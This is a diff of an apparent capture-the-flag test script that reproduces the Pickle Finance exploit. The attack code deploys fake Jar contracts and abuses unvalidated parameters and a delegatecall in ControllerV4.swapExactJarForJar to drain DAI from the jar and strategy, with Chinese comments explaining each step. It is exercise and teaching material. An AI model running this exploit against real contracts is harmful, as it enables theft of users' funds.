@@ -57,13 +57,12 @@ describe('[Challenge] Pickle', function () {
     console.log('Before, Strategy DAI Balance', await formatToken(await DAI.balanceOf(strategyCmpdDai.address), DAI));
     console.log('Before, DAI balance on pDAI', await formatToken(await DAI.balanceOf(pickleJar.address), DAI));
 
-    // 從 Pickle Controller.swapExactJarForJar() 發動攻擊
-    // swapExactJarForJar() 未驗證參數 _fromJar, _toJar 是否為官方的 Jar 合約地址，也未過濾參數 _targets, _data 的內容
-    // 加上 swapExactJarForJar() 中的 _execute() 有呼叫 delegatecall()，導致攻擊者可以劫持 Controller 身份進行任意 Delegatecall 調用
-    // swapExactJarForJar() ref: https://etherscan.io/address/0x6847259b2B3A4c17e7c43C54409810aF48bA5210#code#F26#L249
-    // _execute() ref: https://etherscan.io/address/0x6847259b2B3A4c17e7c43C54409810aF48bA5210#code#F26#L336
+    // 1. 攻擊合約 New 了兩個 FakeJar 合約，FakeJar 合約繼承了 Jar 的介面
+    // 3. 利用參數驗證不足漏洞，調用 ControllerV4.swapExactJarForjar() 並傳入先前 New 的兩個 Jar。
+    // 由於 _fromJar 的 Underlying 是 DAI (jarA)，jarA 當然沒有足夠的 DAI 可以遷移。
     await controller.swapExactJarForJar(fakeJarA.address, fakeJarB.address, 19728769153362174946836922n, 0, [], []);
 
+    // 4. 攻擊者呼叫 pDAI.earn() 將 pDAI 合約中的 DAI 再存回到 StrategyCmdDaiV2 上並mint 出 cDAI，一共呼叫了三次 earn。
     await pickleJar.earn();
     await pickleJar.earn();
     await pickleJar.earn();
@@ -71,18 +70,21 @@ describe('[Challenge] Pickle', function () {
     const borrowedView = await strategyCmpdDai.getBorrowedView();
     console.log(`borrowedView: ${borrowedView}`);
 
+    // 5. 攻擊合約再次 New 了兩個 FakeJar 合約，與一個 FakeUnderlying 合約
+    // 6. 再次利用參數驗證不足漏洞，調用 ControllerV4.swapExactJarForjar()
+    // 從 Pickle Controller.swapExactJarForJar() 發動攻擊
+    // swapExactJarForJar() 未驗證參數 _fromJar, _toJar 是否為官方的 Jar 合約地址，也未過濾參數 _targets, _data 的內容
+    // 加上 swapExactJarForJar() 中的 _execute() 有呼叫 delegatecall()，導致攻擊者可以劫持 Controller 身份進行任意 Delegatecall 調用
+    // swapExactJarForJar() ref: https://etherscan.io/address/0x6847259b2B3A4c17e7c43C54409810aF48bA5210#code#F26#L249
+    // _execute() ref: https://etherscan.io/address/0x6847259b2B3A4c17e7c43C54409810aF48bA5210#code#F26#L336
     const withdrawIntf = new ethers.utils.Interface(['function withdraw(address)']);
     const withdrawFunctionSelector = withdrawIntf.getSighash('withdraw(address)');
     const targets = [curve.address];
     const datas = [getFunctionSignature(STRATEGY_CMPD_DAI_V2, withdrawFunctionSelector, fakeUnderlying.address)];
-    console.log(`datas: ${datas[0]}`);
     await controller.swapExactJarForJar(fakeJarC.address, fakeJarD.address, 0, 0, targets, datas);
 
     const balanceOfUnderlying = await cDAI.balanceOfUnderlying(attacker.address);
-    console.log(`balanceOfUnderlying: ${balanceOfUnderlying}`, balanceOfUnderlying);
-
-    // const u = await cDAI.redeemUnderlying();
-    // console.log(`u: ${u}`);
+    const u = await cDAI.redeemUnderlying();
 
     // Attacker has taken all tokens from the pool
     console.log('After, Attacker cDAI Balance', await formatToken(await cDAI.balanceOf(attacker.address), cDAI));
